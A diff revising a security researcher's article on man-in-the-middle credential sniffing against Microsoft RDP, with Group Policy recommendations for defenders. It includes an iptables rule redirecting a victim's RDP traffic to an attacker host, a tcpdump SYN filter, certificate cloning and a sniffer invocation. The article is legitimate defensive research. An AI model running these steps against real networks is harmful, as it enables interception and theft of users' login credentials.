@@ -35,8 +35,8 @@ We will demonstrate how a MitM can sniff your credentials if you aren't
 careful. None of this is particularly new - it even has been done before,
 for example by [Cain](http://www.oxid.it/cain.html). However, Cain is rather
 old, closed source and only available for Windows. We want to analyze all
-the gory details of RDP and simulate a real attack on it as closely as
-possible.
+the gory details and relevant inner workings of RDP and simulate a real
+attack on it as closely as possible.
 
 It should go without saying that the findings in this article must not be
 used to gain unauthorized access to any system you do not own. They may only
@@ -73,7 +73,7 @@ Authentication (NLA).
 
 Early user authentication is a feature that allows the server to deny access
 even before any credentials (except for the username) have been submitted, for
-example if the user does not have remote access privileges.
+example if the user does not have the necessary remote access privileges.
 
 In our Wireshark session, we can see that an SSL handshake is performed after
 client and server have agreed on using enhanced RDP security. For this, we
@@ -124,13 +124,19 @@ The way standard RDP security works is this:
   from the Server Random and the Client Random. These keys are used for
   symmetrically encrypting the rest of the session.
 
-Note that all of this happens in plain text, not inside an SSL tunnel. Can
-you spot the mistake? How does the client get the Terminal Services public
-key? The answer is: It comes pre-installed. That means it's the same key on
-every system. And THAT means the private key is also always the same! So it
-can be extracted from any Windows installation. In fact, we don't even need
-to do that, since by now Microsoft has decided to officially publish it and
-we can simply look it up at
+Note that all of this happens in plain text, not inside an SSL tunnel.
+That's fine in principle, Microsoft simply tried to implement the same
+techniques which SSL employs themselves. However, [cryptography is
+hard](https://www.schneier.com/essays/archives/1997/01/why_cryptography_is.html),
+and as a general rule, you should always rely on established solutions that
+stood the test of time instead of implementing your own.
+
+Can you spot the mistake here? How does the client get the Terminal Services
+public key? The answer is: It comes pre-installed. That means it's the same
+key on every system. And THAT means the private key is also always the same!
+So it can be extracted from any Windows installation. In fact, we don't even
+need to do that, since by now Microsoft has decided to officially publish it
+and we can simply look it up at
 [microsoft.com](https://msdn.microsoft.com/en-us/library/cc240776.aspx).
 
 
@@ -176,7 +182,7 @@ Breaking enhanced RDP security
 
 To me, downgrading to standard RDP security is unsatisfactory. If I were an
 attacker, I'd try to make the attack look as inconspicuous as possible. The
-victim will notice a different warning than usual and that they have to
+victim will notice a different warning than usual and that it has to
 enter their credentials after the connection has already been established.
 
 It always bugged me that I don't see the same SSL warning when I MitM the
@@ -292,23 +298,32 @@ victim intended for an RDP server to our host:
     iptables -t nat -A PREROUTING -p tcp -s $VICTIM_IP --dport 3389 \
         -j DNAT --to-destination $ATTACKER_IP:3389
 
-Second, we wait for TCP packet with destination port 3389 from the victim.
-We use `tcpdump` for this:
+Second, we wait for a TCP SYN packet with destination port 3389 from the
+victim.  We use `tcpdump` for this:
 
     tcpdump -n -c 1 -i "$IFACE" src host "$VICTIM_IP" and \
+        "tcp[tcpflags] & tcp-syn != 0" and \
         dst port 3389 2> /dev/null  | \
         sed -e  's/.*> \([0-9.]*\)\.3389:.*/\1/'
 
 The `-c 1` options tells `tcpdump` to exit after the first matching packet.
+This SYN packet will be lost, since our service isn't running yet. But that
+doesn't really matter, it will only be a short while before the victim's
+system will try again. We don't want to capture any other packets, since
+they would most likely belong to an already active RDP connection. Note that
+this will disrupt active RDP connections of the victim, so you need to warn
+them in advance. Don't do it without permission!
+
 
 Third, we'll retrieve the SSL certificate of the RDP server and create a new
 self-signed certificate that has the same common name as the original
 certificate. We could also fix the certificate's expiration date, and it
-will be literally indistinguishable unless you take a good, hard look at its
-fingerprint. I wrote a [small `bash` script](...) to do the job for us.
+will be literally indistinguishable from the original unless you take a
+long, hard look at its fingerprint. I wrote a [small Bash script](...) to
+do the job for us.
 
 
-Now we have all the information we need to run our python script:
+At this point we have all the information we need to run our Python script:
 
     rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" "$ORIGINAL_DEST"
 
@@ -318,20 +333,50 @@ Now we have all the information we need to run our python script:
 Recommendations
 ---------------
 
+Now you're probably wondering what you, as a system administrator, can do
+about all of this to keep your network secure.
+
 First of all, it is absolutely critical that RDP connections cannot happen
 if the SSL certificate is not signed by a trusted certificate authority (CA).
 Clients must to be configured via Group Policy Objects to disallow
 connections if the certificate cannot be validated.
 
+Computer configuration -> Policies -> Administrative Templates -> Windows
+Components -> Remote Desktop Services (or Terminal Services) -> Remote
+Desktop Connection Client -> Configure server authentication for client
+
+https://technet.microsoft.com/en-us/library/cc753945(v=ws.10).aspx
+
+![Configure server authentication for client](images/gpo-server-auth.png)
+
 Next, servers must insist on using CredSSP (NLA).  This can also be rolled
-out as a group policy. TODO which one
+out as a group policy.
+
+... -> Remote Desktop Services -> Remote Desktop Session Host (or Terminal
+Server) -> Security -> Require user authentication for remote connections by
+using Network Level Authentication
+
+https://technet.microsoft.com/en-us/library/cc771869(v=ws.10).aspx
+
 
 If you cannot use solely NLA due to compatibility reasons, you must sign all
 server certificates with your enterprise root CA and disallow standard RDP
-security. TODO look up config
+security. Set to TLS:
+
+... Require use of specific security layer for remote connections
+
+![Require use of specific security layer for remote
+connections](images/gpo-tls-nla.png)
 
 Lastly, you are encouraged to educate your colleagues and users that SSL
-warnings are not to be taken lightly. As administrator, you are responsible
-for making sure that your client systems have your CA in their list of
-trusted CAs.  This way, these warnings should be the exception rather than
-the rule which warrant a call to the IT department.
+warnings are not to be taken lightly. As the administrator, you are
+responsible for making sure that your client systems have your CA in their
+list of trusted CAs. This way, these warnings should be the exception rather
+than the rule and warrant a call to the IT department.
+
+If you have any more questions or comments, just [let me
+know](mailto:rdp@vollmer.syss.de).
+
+
+
+- Dr. Adrian Vollmer, IT Security Consultant at SySS GmbH
